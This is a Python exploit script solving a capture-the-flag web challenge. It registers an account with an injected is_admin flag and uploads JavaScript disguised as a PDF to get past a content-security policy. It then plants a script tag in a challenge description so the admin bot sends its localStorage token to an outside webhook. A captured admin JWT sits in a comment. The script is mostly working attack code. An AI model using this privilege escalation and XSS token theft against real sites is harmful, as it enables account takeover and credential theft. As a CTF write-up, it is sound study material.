import requests
from base64 import b64encode

# FLAG 1 = submit same flag over and over
# FLAG 2 = hit /api/register with is_admin = True

# FLAG 3 = xss in chall description, steal admin token but there's content-security-policy: script-src 'self' so we can't run js
# but we can craft js file with pdf mime type and upload it to /api/upload

"""
//%PDF-
window.location.href='https://exploit.free.beeceptor.com?c='+localStorage.token;
"""

# BASE = "http://worker01.flag4jobs.live:10106"
BASE = "http://localhost"
a = requests.post(f"{BASE}/api/register", json={"username":"k","password":"b","is_admin":"True"}).text
print(a)


s = requests.Session()
r = s.post(f"{BASE}/api/login", json={"username":"k","password":"b"})
print(r.text)

token = r.json()['access_token']
s.headers.update({"Authorization": f"Bearer {token}"})

pl = b64encode(open('payload.pdf', 'rb').read()).decode()
print(pl)
r = s.post(f"{BASE}/api/challenges", json={"title":"aaaaa","description":"dsadsadsadsa","score":100,"flag":"dsadsadsa","attachment_filename":"payload.pdf","attachment_content":pl})
print(r.text)

r = s.get(f"{BASE}/api/challenges")
print(r.json())
file = "/" + r.json()[-1]['attachment_filename']
print(file)

r = s.post(f"{BASE}/api/challenges", json={"title":"winwin","description":f"<script src='{file}'></script>","score":100,"flag":"dsadsadsa", "attachment_filename":"","attachment_content":""})
print(r.text)

r = s.get(f"{BASE}/api/challenges")
print(r.json()[-1])

# REPORT BOT
x = s.get(f"{BASE}/api/report")
print(x.text)

# see webhook to get the admin jwt
# q = requests.get(f"{BASE}/api/profile/me", headers={"Authorization": f"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo4LCJpc19hZG1pbiI6dHJ1ZSwiZXhwIjoxNzU4MDAyOTMxfQ.PuCpp-yenaCITawN-MVYqfPGoV0Y-gTNMDSrb43fMVA"}) 
# print(q.text)